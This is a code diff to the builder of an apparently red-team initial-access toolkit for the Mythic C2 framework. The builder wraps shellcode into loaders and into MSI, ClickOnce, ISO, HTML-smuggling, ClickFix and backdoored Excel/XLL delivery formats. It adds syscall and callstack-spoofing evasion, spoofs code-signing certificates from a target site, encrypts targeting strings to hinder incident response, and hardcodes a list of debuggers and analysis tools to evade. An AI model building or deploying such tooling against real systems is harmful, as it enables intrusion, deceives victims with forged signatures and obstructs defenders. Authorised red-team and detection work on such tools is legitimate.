@@ -9,41 +9,70 @@ from erebus_wrapper.erebus.modules import run_plugin_validation, report_validati
 
 _plugin_loader = get_plugin_loader()
 
-_PLUGIN_FUNCTIONS = [
-    "generate_proxies",
-    "build_clickonce",
-    "build_msi",
-    "hijack_msi",
-    "add_multiple_files_to_msi",
-    "create_custom_action",
-    "create_payload_trigger",
-    "create_bat_payload_trigger",
-    "create_msi_payload_trigger",
-    "create_clickonce_trigger",
-    "build_7z",
-    "build_zip",
-    "build_iso",
-    "build_electron_installer",
-    "self_sign_payload",
-    "get_remote_cert_details",
-    "sign_with_provided_cert",
-    "generate_excel_payload",
-    "backdoor_existing_excel",
-    "generate_xll_template",
-    "register_xll_function",
-    "create_msc_explorer_trigger",
-    "create_html_smuggling_trigger",
-    "create_clickfix_trigger",
-]
+# Auto-inject every function exported by a loaded plugin into the builder's
+# module namespace. The source of truth is `_plugin_loader.functions`, which
+# plugin_loader.load_all_plugins() builds by calling each ErebusPlugin's
+# register() and collecting the returned {name: callable} mappings. Only
+# what a plugin explicitly exports via register() lands here - internal
+# archive helpers stay private.
+#
+# Historical note (pre-R1c): this used to be a hand-maintained
+# _PLUGIN_FUNCTIONS list + explicit get_function() loop. Any plugin-side
+# rename that wasn't mirrored in the list would silently bind the old name
+# to None, and the build would crash at call time deep inside build() with
+# "'NoneType' object is not callable". Auto-discovery + the integrity
+# assertion below fail loudly at import time instead.
+globals().update(_plugin_loader.functions)
 
-for _func_name in _PLUGIN_FUNCTIONS:
-    globals()[_func_name] = _plugin_loader.get_function(_func_name)
+# Integrity check: every plugin function the builder currently calls should
+# resolve after auto-discovery. Missing names get logged upfront so the
+# root cause is visible in the Mythic build log, but are not hard-asserted:
+# a plugin can legitimately fail to load when its host environment is
+# missing an optional dependency (e.g. py7zr, pycdlib, pylnk3, openpyxl in
+# bare Python environments), and taking the whole builder out in that
+# situation is stricter than the pre-refactor behaviour.
+#
+# Pre-R1c the builder did `globals()[n] = _plugin_loader.get_function(n)`
+# which silently bound missing names to None; build() would then crash with
+# "'NoneType' object is not callable" at call time. Post-R1c the name is
+# simply not bound and the failure manifests as AttributeError at call
+# time - strictly clearer, behaviour-preserving, and the warning below
+# gives an upfront diagnostic that pre-R1c had no equivalent for.
+_REQUIRED_PLUGIN_FUNCTIONS = [
+    "generate_proxies",
+    "build_clickonce", "build_msi", "hijack_msi",
+    "add_multiple_files_to_msi", "create_custom_action",
+    "create_payload_trigger", "create_bat_payload_trigger",
+    "create_msi_payload_trigger", "create_clickonce_trigger",
+    "create_msc_explorer_trigger", "create_html_smuggling_trigger",
+    "create_clickfix_trigger",
+    "build_7z", "build_zip", "build_iso", "build_electron_installer",
+    "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
+    "generate_excel_payload", "backdoor_existing_excel",
+    "generate_command_execution_vba",
+    "generate_xll_template", "register_xll_function",
+    "sanitize_pe", "generate_self_hunt_rules",
+    # R2a - shellcode_obfuscation helpers
+    "build_obfuscation_cmd", "build_key_extraction_cmd", "build_raw_key_cmd",
+    "parse_key_iv", "extract_raw_key_array",
+    # R2b - loader_config helper
+    "build_loader_config_data",
+]
+_missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
+if _missing:
+    print(
+        f"[Plugin] WARNING: builder expects but cannot find these plugin functions: "
+        f"{_missing}. A plugin either failed to load or renamed a registered function. "
+        f"Any build path using these names will fail with AttributeError at call time. "
+        f"Check the [Plugin] Error log lines above for load errors."
+    )
 
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 from pathlib import PurePath
-from distutils.dir_util import copy_tree
+# distutils was removed in Python 3.12; shutil.copytree(..., dirs_exist_ok=True)
+# matches the merge-into-existing-dir semantics the old copy_tree provided.
 from jinja2 import Environment, FileSystemLoader
 from datetime import datetime
 from pathlib import Path
@@ -54,6 +83,55 @@ import hashlib
 import asyncio
 import subprocess
 import zipfile
+import secrets
+
+# ============================================================================
+# Guardrail string encryption
+# ============================================================================
+# Guardrail allowlist/blocklist entries (hostnames, usernames, domains, IPs)
+# used to be emitted as plaintext `const char*` arrays in the compiled loader,
+# which meant `strings` on a delivered sample trivially leaked target scoping
+# data. We now XOR-encrypt each entry at build time with a per-build random
+# key and emit byte arrays; the generated DecryptGuardrails() stub decrypts
+# them in place on first call inside GetGuardrailConfig().
+#
+# This defeats static string hunts and family-level YARA. It does not defeat
+# a determined reverse engineer (the key is next to the ciphertext) - that's
+# acceptable for guardrail scoping data, where the goal is to frustrate
+# automated triage and avoid leaking operator targeting to incident response.
+
+GUARDRAIL_LIST_KEYS = [
+    "GUARDRAIL_ALLOWED_HOSTNAMES",
+    "GUARDRAIL_BLOCKED_HOSTNAMES",
+    "GUARDRAIL_BLOCKED_USERNAMES",
+    "GUARDRAIL_ALLOWED_IPS",
+    "GUARDRAIL_BLOCKED_IPS",
+    "GUARDRAIL_ALLOWED_DOMAINS",
+]
+
+def build_guardrail_encryption(gr_lists: dict) -> dict:
+    """Encrypt guardrail string lists with a per-build XOR key.
+
+    Input:  { "GUARDRAIL_ALLOWED_HOSTNAMES": ["host1", "host2"], ... }
+    Output: template vars consumed by config.hpp:
+        GR_XOR_KEY          -> list[int]  (16 random bytes)
+        GR_ENC_<LIST_NAME>  -> list[list[int]]  per-entry ciphertext
+                               (includes trailing NUL byte, also XORed)
+        GR_COUNT_<LIST_NAME>-> int  (number of entries, convenience)
+    """
+    key = list(secrets.token_bytes(16))
+    out = {"GR_XOR_KEY": key}
+    for name in GUARDRAIL_LIST_KEYS:
+        entries = gr_lists.get(name, []) or []
+        enc_entries = []
+        for s in entries:
+            raw = s.encode("utf-8") + b"\x00"
+            ct = [raw[i] ^ key[i % len(key)] for i in range(len(raw))]
+            enc_entries.append(ct)
+        out[f"GR_ENC_{name}"] = enc_entries
+        out[f"GR_COUNT_{name}"] = len(enc_entries)
+    return out
+
 
 ENCRYPTION_METHODS = {
     "AES_ECB"    :  "aes_ecb",
@@ -112,11 +190,129 @@ FINAL_PAYLOAD_EXTENSIONS = [
 ]
 
 
+def parse_csv(value):
+    """Split a CSV parameter value into a trimmed, non-empty list.
+
+    Used across guardrail parameter extraction (Shellcode Loader, ClickOnce,
+    DLL Hijack). Previously defined as two nested duplicates inside build()
+    - see the R1a refactor.
+    """
+    if not value or not isinstance(value, str):
+        return []
+    return [item.strip() for item in value.split(',') if item.strip()]
+
+
+def array_to_csharp_string(lst):
+    """Render a Python list as a C# string-array literal body.
+
+    Produces `"a", "b", "c"` (no brackets). Consumed by the ClickOnce
+    InjectionConfig.cs template where fields expect inline string-array
+    initializer bodies.
+    """
+    if not lst or len(lst) == 0:
+        return ""
+    return ", ".join(f'"{item}"' for item in lst)
+
+
+def collect_guardrail_gr_lists(wrapper, enabled: bool, param_names: dict) -> dict:
+    """Assemble the GUARDRAIL_* dict fed into the config.hpp Jinja template.
+
+    `param_names` maps each GUARDRAIL_* key to the Mythic parameter name
+    that supplies its CSV value, for example::
+
+        {
+            "GUARDRAIL_ALLOWED_HOSTNAMES": "0.5g Hostname Whitelist",
+            ...
+        }
+
+    Passing parameter names explicitly (rather than assuming a letter-offset
+    convention) keeps this helper usable from the Shellcode Loader site
+    (`0.5g`-`0.5l`) and the DLL Hijack site (`1.1f`-`1.1k`) even though the
+    two schemas don't share a letter alignment - if a schema drifts, each
+    call site updates its own name list independently.
+
+    Returns a dict pre-merged with `build_guardrail_encryption(gr_lists)` so
+    callers do not have to remember the double-splat idiom.
+    """
+    gr_lists = {
+        key: (parse_csv(wrapper.get_parameter(pname)) if enabled else [])
+        for key, pname in param_names.items()
+    }
+    return {**gr_lists, **build_guardrail_encryption(gr_lists)}
+
+
+def _finalize_pe_artifact(
+    payload_path: str,
+    payload_dir: str,
+    *,
+    build_config: str = "release",
+) -> str:
+    """Run post-compile PE finalization on a just-built PE.
+
+    Sequence (release builds only):
+      1. sanitize_pe() - scrub MinGW / compiler fingerprints from the PE
+         before anything downstream consumes it (codesign, packaging,
+         IOC hashing).
+      2. generate_self_hunt_rules() - emit per-build YARA + Sigma rules
+         alongside the payload so operators can validate the artifact
+         against the target SIEM before delivery.
+
+    Both steps are non-fatal by contract: failures append warning lines to
+    the returned string rather than raising, so the build always proceeds.
+    The returned string is appended to the builder's `output` accumulator
+    (which feeds `response.build_stdout`); an empty return is valid when
+    both steps succeed silently (self_hunt does append a success line, so
+    in practice the return is non-empty on success).
+
+    build_config == "debug" skips both steps entirely. Debug binaries are
+    never delivered to targets (they're O0 + contain DWARF, fingerprintable
+    trivially on sight), so the sanitizer has no OPSEC value on them and
+    has historically caused load failures on Windows when it inadvertently
+    touched something the runtime still referenced. Leaving debug builds
+    untouched is both the correct policy and the safer one.
+    """
+    if build_config == "debug":
+        return "[pe_sanitize] skipped on debug build\n"
+    lines = []
+    try:
+        sanitize_pe(payload_path)
+    except Exception as san_err:
+        lines.append(f"[pe_sanitize] warning: {san_err}")
+    try:
+        sh = generate_self_hunt_rules(payload_path, payload_dir)
+        lines.append(f"[self_hunt] {sh['rule_name']} -> {sh['yara']}")
+    except Exception as sh_err:
+        lines.append(f"[self_hunt] warning: {sh_err}")
+    return ("\n".join(lines) + "\n") if lines else ""
+
+
+# Default debugger / analysis process blocklist rendered into ClickOnce
+# InjectionConfig.cs `BlockedProcesses`. Covers native debuggers, .NET
+# decompilers, process monitors, traffic inspectors, and common sandbox
+# harness processes. Hoisted from a nested local in build() so it is a
+# single canonical list rather than re-initialized on every ClickOnce build.
+DEFAULT_BLOCKED_PROCESSES = [
+    # Native debuggers
+    "x64dbg", "x32dbg", "windbg", "ollydbg", "ida", "ida64",
+    "immunitydebugger", "radare2",
+    # .NET decompilers / analysis
+    "dnspy", "dnspyex", "dotpeek", "ilspy",
+    "jetbrains.rider", "reflector", "de4dot", "ildasm",
+    # Process monitors / system inspectors
+    "processhacker", "procmon", "procmon64", "procexp",
+    "procexp64", "autoruns", "autorunsc",
+    # Traffic inspection
+    "wireshark", "dumpcap", "tcpdump", "fiddler",
+    "fiddler everywhere", "charles", "burpsuite",
+    # Sandboxing / analysis harnesses
+    "sbiectrl", "sandboxiedcomlaunch", "cuckoo",
+]
+
 
 class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
-    semver = "v0.0.2"
+    semver = "v0.0.3"
     
     note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"
 
@@ -261,9 +457,10 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = """Select the injection technique for the Shellcode Loader:
 1 = NtMapViewOfSection (Remote)
 2 = CreateFiber (Self)
-3 = EarlyCascade / NtQueueApcThread (Remote)
-4 = PoolParty (Remote)""",
-            choices = ["1", "2", "3", "4"],
+3 = EarlyCascade (Remote)
+4 = PoolParty (Remote)
+5 = NtQueueApcThread (Remote)""",
+            choices = ["1", "2", "3", "4", "5"],
             default_value = "3",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
@@ -418,6 +615,40 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        # Evasion backend toggles (config.hpp CONFIG_SYSCALL_BACKEND /
+        # CONFIG_CALLSTACK_SPOOF_ENABLED). Both apply to the native C++
+        # loader (Shellcode Loader + DLL Hijack); ClickOnce is unaffected.
+        BuildParameter(
+            name = "0.5m Syscall Backend",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "Syscall dispatch layer for Nt* calls.\n"
+                "TartarusGate: built-in indirect syscall shim page.\n"
+                "SysWhispers3: generated Sw3Nt* stubs."
+            ),
+            choices = ["TartarusGate", "SysWhispers3"],
+            default_value = "TartarusGate",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5n Callstack Spoofing",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Enable Callstack Spoofing"
+            ),
+            default_value = False,
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
             ]
         ),
 
@@ -1545,7 +1776,7 @@ generated if none have been entered.""",
             description="Sign the loader with a code signing cert",
             required=False,
             hide_conditions = [
-                HideCondition(name="0.3 Loader Build Configuration", operand=HideConditionOperand.NotEQ, value="test"),
+                HideCondition(name="0.3 Loader Build Configuration", operand=HideConditionOperand.EQ, value="test"),
             ]
         ),
 
@@ -1672,6 +1903,140 @@ generated if none have been entered.""",
             for byte_block in iter(lambda: f.read(4096), b""):
                 sha256_hash.update(byte_block)
         return sha256_hash.hexdigest()
+
+    async def _build_step(self, name: str, stdout: str, success: bool = True) -> None:
+        """Send a build-step update to Mythic.
+
+        Wraps the SendMythicRPCPayloadUpdatebuildStep boilerplate. Used at
+        every phase boundary in build() so the orchestration reads at the
+        phase level instead of at the RPC level.
+        """
+        await SendMythicRPCPayloadUpdatebuildStep(
+            MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName=name,
+                StepStdout=stdout,
+                StepSuccess=success,
+            )
+        )
+
+    async def _apply_codesign(self, agent_build_path, dll_file_name, response) -> bool:
+        """Dispatch code signing based on the configured signing mode.
+
+        Returns True on success (or when signing is disabled), False on
+        any failure - the caller is expected to early-return `response`
+        on False so the error build_stderr/build_step propagates.
+
+        Modes (parameter "6.1 Codesign Type"):
+          - SelfSign: fresh self-generated cert with operator-supplied CN/Org.
+          - Spoof URL: fetch a real cert's public fields from a target URL
+            via get_remote_cert_details() and self-sign with them - produces
+            a cert that *looks* like the legitimate one to cursory
+            inspection but is not actually chained to a trusted CA.
+          - Provide Certificate: operator uploads a .pfx via Mythic; we
+            fetch its bytes and call osslsigncode with the supplied pass.
+
+        R3b: this method replaces a 75-line inline block at the previous
+        code-signing section. A duplicate `elif signing_type == "Provide
+        Certificate"` that raised NotImplementedError was dead code
+        (unreachable because the first branch already matched) and has
+        been removed.
+        """
+        if not self.get_parameter("6.0 Codesign Loader"):
+            return True
+
+        try:
+            main_type = self.get_parameter("0.0 Main Payload Type")
+            loader_type = self.get_parameter("0.1 Loader Type")
+            if main_type == "Loader":
+                if loader_type == "ClickOnce":
+                    payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
+                else:
+                    payload_path = Path(agent_build_path) / "payload" / f"erebus.{self.get_parameter('0.2 Loader Format')}"
+            elif main_type == "Hijack":
+                payload_path = Path(agent_build_path) / "payload" / dll_file_name
+            else:
+                raise ValueError("Unsupported payload type for code signing")
+
+            if not payload_path.exists():
+                raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")
+
+            signing_type = self.get_parameter("6.1 Codesign Type")
+
+            if signing_type == "SelfSign":
+                cn = self.get_parameter("6.2 Codesign CN")
+                org = self.get_parameter("6.3 Codesign Orgname") or cn
+                self_sign_payload(
+                    payload_path=payload_path,
+                    subject_cn=cn,
+                    org_name=org,
+                )
+                success_msg = f"Self-signed with CN: {cn}"
+
+            elif signing_type == "Spoof URL":
+                target_url = self.get_parameter("6.4 Codesign Spoof URL")
+                if not target_url:
+                    raise ValueError("No URL provided for spoofing")
+                cert_details = get_remote_cert_details(target_url)
+                self_sign_payload(
+                    payload_path=payload_path,
+                    subject_cn=cert_details["CN"],
+                    org_name=cert_details["O"],
+                    full_details=cert_details,
+                )
+                success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"
+
+            elif signing_type == "Provide Certificate":
+                cert_uuid = self.get_parameter("6.5 Codesign Cert")
+                cert_pass = self.get_parameter("6.6 Codesign Cert Password")
+                if not cert_uuid:
+                    raise ValueError("No certificate file uploaded")
+                file_resp = await SendMythicRPCFileGetContent(
+                    MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
+                )
+                if not file_resp.Success:
+                    raise ValueError("Failed to retrieve certificate file")
+                cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
+                cert_path.write_bytes(file_resp.Content)
+                sign_with_provided_cert(
+                    payload_path=payload_path,
+                    cert_path=cert_path,
+                    cert_password=cert_pass,
+                )
+                success_msg = "Signed with provided certificate"
+
+            else:
+                raise ValueError(f"Unknown signing_type: {signing_type!r}")
+
+            await self._build_step("[T1553.006] - Sign Shellcode Loader", f"Success: {success_msg}", success=True)
+            return True
+
+        except Exception as e:
+            await self._build_step("[T1553.006] - Sign Shellcode Loader", f"Signing Failed: {str(e)}", success=False)
+            response.status = BuildStatus.Error
+            response.build_stderr = f"Code signing failed: {str(e)}"
+            return False
+
+    async def _fail_step(
+        self,
+        response,
+        step_name: str,
+        stderr: str,
+        step_stdout: str,
+    ) -> None:
+        """Populate an error BuildResponse and emit a failed build step.
+
+        Consolidates the 4-line `response.status = BuildStatus.Error /
+        response.build_stderr = ... / await self._build_step(..., False) /
+        return response` pattern that appeared at 8+ phase-failure sites
+        in build() before the R3c refactor. Callers still issue `return
+        response` after the await so the control flow stays visible at
+        the call site (the helper cannot raise/return-for-you without
+        hiding the control-flow edge).
+        """
+        response.status = BuildStatus.Error
+        response.build_stderr = stderr
+        await self._build_step(step_name, step_stdout, success=False)
 
     def add_to_iocs(self, iocs_list: list, file_path: str, timestamp: str = None) -> None:
         """Add a file's hash to IOCs list"""
@@ -1936,7 +2301,37 @@ generated if none have been entered.""",
 
             agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
             agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
-            copy_tree(str(agent_code_path), agent_build_path)
+            # Exclude stale build artifacts when seeding the temp build tree.
+            #
+            # The Erebus.Loader Makefile uses pattern rules without explicit
+            # header-dependency tracking, so if a previous build left .o
+            # files (or a final erebus.{exe,dll,cpl,xll}) inside the source
+            # `agent_code/Erebus.Loaders/Erebus.Loader/` tree, copytree
+            # preserves their mtimes into the fresh tmp dir. When builder.py
+            # then overwrites `include/shellcode.hpp` with the freshly
+            # obfuscated apollo bytes, make compares mtimes against the
+            # stale .o files (which still know nothing about shellcode.hpp
+            # because it isn't in the per-source dep list) and concludes
+            # "Nothing to be done for 'all'". The link uses the stale
+            # main.o that was compiled against the `{ 0x00 }` stub
+            # shellcode, and the resulting binary fails at runtime with
+            # "[!] Shellcode is NULL or size is 0 after staging".
+            #
+            # Excluding artifacts here is the surgical fix: the copytree
+            # produces a clean source tree every build, make has no stale
+            # .o/binaries to consider up-to-date, and the recompile is
+            # forced to pick up the freshly written shellcode.hpp.
+            shutil.copytree(
+                str(agent_code_path),
+                agent_build_path,
+                dirs_exist_ok=True,
+                ignore=shutil.ignore_patterns(
+                    "*.o", "*.obj",
+                    "erebus.exe", "erebus.dll", "erebus.cpl", "erebus.xll",
+                    "erebus_test*", "erebus_guardrails_test*", "erebus_injection_test*",
+                    "__pycache__",
+                ),
+            )
 
             mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
             mythic_shellcode_path = str(mythic_shellcode_path)
@@ -1986,14 +2381,9 @@ generated if none have been entered.""",
 
             # Validate wrapped_payload - only required when not using custom shellcode
             if self.wrapped_payload is None and not custom_sc_enabled:
-                response.status = BuildStatus.Error
-                response.build_stderr = "No wrapped payload provided. The wrapped_payload is None."
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1005] - Gathering Files",
-                    StepStdout="No wrapped payload provided (wrapped_payload is None).",
-                    StepSuccess=False
-                ))
+                await self._fail_step(response, "[T1005] - Gathering Files",
+                    "No wrapped payload provided. The wrapped_payload is None.",
+                    "No wrapped payload provided (wrapped_payload is None).")
                 return response
 
             # Write Mythic payload as the initial shellcode source (may be overridden below)
@@ -2005,61 +2395,35 @@ generated if none have been entered.""",
             if custom_sc_enabled:
                 custom_sc_uuid = self.get_parameter("0.0b Custom Shellcode File")
                 if not custom_sc_uuid:
-                    response.status = BuildStatus.Error
-                    response.build_stderr = "Custom Shellcode is enabled but no file was uploaded."
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1005] - Gathering Files",
-                        StepStdout="Custom shellcode enabled but no file provided.",
-                        StepSuccess=False
-                    ))
+                    await self._fail_step(response, "[T1005] - Gathering Files",
+                        "Custom Shellcode is enabled but no file was uploaded.",
+                        "Custom shellcode enabled but no file provided.")
                     return response
 
                 custom_sc_resp = await SendMythicRPCFileGetContent(
                     MythicRPCFileGetContentMessage(AgentFileId=custom_sc_uuid)
                 )
                 if not custom_sc_resp.Success or not custom_sc_resp.Content:
-                    response.status = BuildStatus.Error
-                    response.build_stderr = "Failed to retrieve custom shellcode file from Mythic."
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1005] - Gathering Files",
-                        StepStdout="Failed to retrieve custom shellcode file.",
-                        StepSuccess=False
-                    ))
+                    await self._fail_step(response, "[T1005] - Gathering Files",
+                        "Failed to retrieve custom shellcode file from Mythic.",
+                        "Failed to retrieve custom shellcode file.")
                     return response
 
                 with open(mythic_shellcode_path, "wb") as file:
                     file.write(custom_sc_resp.Content)
 
                 output += "[+] Custom shellcode loaded - Mythic wrapped payload ignored.\n"
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1005] - Gathering Files",
-                    StepStdout=f"Custom shellcode loaded ({len(custom_sc_resp.Content)} bytes). Mythic payload overridden.",
-                    StepSuccess=True
-                ))
+                await self._build_step("[T1005] - Gathering Files", f"Custom shellcode loaded ({len(custom_sc_resp.Content)} bytes). Mythic payload overridden.", success=True)
 
             if os.stat(mythic_shellcode_path).st_size == 0:
-                response.status = BuildStatus.Error
-                response.build_stderr = "Shellcode file is empty - nothing to process."
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1005] - Gathering Files",
-                        StepStdout="Shellcode file is empty after write.",
-                        StepSuccess=False
-                    ))
+                await self._fail_step(response, "[T1005] - Gathering Files",
+                    "Shellcode file is empty - nothing to process.",
+                    "Shellcode file is empty after write.")
                 return response
 
             response.status = BuildStatus.Success
             response.build_message = "Files Gathered for Modification."
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID = self.uuid,
-                StepName = "[T1005] - Gathering Files",
-                StepStdout = "Gathered files to obfuscate shellcode",
-                StepSuccess = True
-            ))
+            await self._build_step("[T1005] - Gathering Files", "Gathered files to obfuscate shellcode", success=True)
 
             ######################### Shellcode Obfuscation Section #########################
             # Defaults for config template rendering (may be updated after shellcrypt output)
@@ -2076,55 +2440,33 @@ generated if none have been entered.""",
             with open(str(mythic_shellcode_path), "rb") as f:
                 header = f.read(2)
                 if header == b"\x4d\x5a":
-                    response.status = BuildStatus.Error
-                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1027] - Header Check",
-                        StepStdout="Found leading MZ header - supplied file was not shellcode",
-                        StepSuccess=False
-                    ))
+                    await self._fail_step(response, "[T1027] - Header Check",
+                        "Supplied payload is a PE instead of raw shellcode.",
+                        "Found leading MZ header - supplied file was not shellcode")
                     return response
             response.status = BuildStatus.Success
             response.build_message = "No leading MZ header found in payload."
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="[T1027] - Header Check",
-                StepStdout="No leading MZ header found in payload",
-                StepSuccess=True
-            ))
+            await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
 
-            cmd = [
-                "python",
+            # R2a: command construction lives in plugin_shellcode_obfuscation
+            # (pure function in archive/shellcode_obfuscation.py). The async
+            # subprocess run + output accumulation stays here because it's
+            # tied to build()'s response/output state and would need a
+            # context object to push into a plugin cleanly.
+            _comp = self.get_parameter("2.0 Compression Type")
+            _enc = self.get_parameter("2.3 Encoding Type")
+            _key = self.get_parameter("2.2 Encryption Key")
+            cmd = build_obfuscation_cmd(
                 shellcrypt_path,
-                "-i", mythic_shellcode_path,
-                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                # "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
-            ]
-
-            match self.get_parameter("0.1 Loader Type"):
-                case "ClickOnce":
-                    cmd += ["-f", "csharp"]
-                case "Shellcode Loader":
-                    cmd += ["-f", "c"]
-                case _:
-                    cmd += ["-f", "c"]
-
-            if self.get_parameter("2.4 Shellcode Format") != "Raw":
-                cmd += ["-a", "shellcode"]
-
-            if self.get_parameter("2.0 Compression Type") != "NONE":
-                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
-
-            if self.get_parameter("2.3 Encoding Type") != "NONE":
-                cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]
-
-            if self.get_parameter("2.2 Encryption Key") != "NONE":
-                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
-
-            cmd += ["-o", obfuscated_shellcode_path]
+                mythic_shellcode_path,
+                obfuscated_shellcode_path,
+                encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                loader_type=self.get_parameter("0.1 Loader Type"),
+                shellcode_format=self.get_parameter("2.4 Shellcode Format"),
+                compression_method=(COMPRESSION_METHODS[_comp] if _comp and _comp != "NONE" else None),
+                encoding_method=(ENCODING_METHODS[_enc] if _enc and _enc != "NONE" else None),
+                encryption_key=_key,
+            )
 
             process = await asyncio.create_subprocess_exec(
                 *cmd,
@@ -2139,36 +2481,27 @@ generated if none have been entered.""",
                 output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
-                # Always get shellcrypt output in C format to extract key/IV for config template
+                # Re-run shellcrypt in C format so we can parse the key/IV
+                # bytes out of its stdout and thread them into config.hpp.
+                # Command construction + regex parsing live in the
+                # shellcode_obfuscation plugin.
                 try:
-                    import re
-                    key_cmd = [
-                        "python",
+                    _comp2 = self.get_parameter("2.0 Compression Type")
+                    _enc2 = self.get_parameter("2.3 Encoding Type")
+                    key_cmd = build_key_extraction_cmd(
                         shellcrypt_path,
-                        "-i", mythic_shellcode_path,
-                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                        "-f", "c",
-                        "-a", "shellcode",
-                    ]
-
-                    if self.get_parameter("2.2 Encryption Key") != "NONE":
-                        key_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
-
-                    if self.get_parameter("2.0 Compression Type") != "NONE":
-                        key_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
-
-                    if self.get_parameter("2.3 Encoding Type") != "NONE":
-                        key_cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]
-
+                        mythic_shellcode_path,
+                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                        compression_method=(COMPRESSION_METHODS[_comp2] if _comp2 and _comp2 != "NONE" else None),
+                        encoding_method=(ENCODING_METHODS[_enc2] if _enc2 and _enc2 != "NONE" else None),
+                        encryption_key=self.get_parameter("2.2 Encryption Key"),
+                    )
                     shellcode_src = subprocess.check_output(key_cmd, text=True)
-
-                    key_match = re.search(r"unsigned char\s+key\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
-                    if key_match:
-                        encryption_key_bytes = ", ".join(x.strip() for x in key_match.group(1).split(",") if x.strip())
-
-                    iv_match = re.search(r"unsigned char\s+iv\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
-                    if iv_match:
-                        encryption_iv_bytes = ", ".join(x.strip() for x in iv_match.group(1).split(",") if x.strip())
+                    _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
+                    if _key_parsed is not None:
+                        encryption_key_bytes = _key_parsed
+                    if _iv_parsed is not None:
+                        encryption_iv_bytes = _iv_parsed
                 except Exception as e:
                     output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"
 
@@ -2191,28 +2524,18 @@ generated if none have been entered.""",
                                 dst=str(xll_shellcode_path))
 
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
-                    # Get the encryption key in C format to be used within the loader and other functions
-                    cmd = [
-                        "python",
+                    # Raw format: re-run shellcrypt in C mode and slice the
+                    # `unsigned char key[] = {...};` declaration out of
+                    # stdout so the loader can compile it in directly.
+                    cmd = build_raw_key_cmd(
                         shellcrypt_path,
-                        "-i", mythic_shellcode_path,
-                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                        "-f",
-                        "c",
-                        "-a",
-                        "shellcode"
-                    ]
-
-                    if self.get_parameter("2.2 Encryption Key") != "NONE":
-                        cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
-
+                        mythic_shellcode_path,
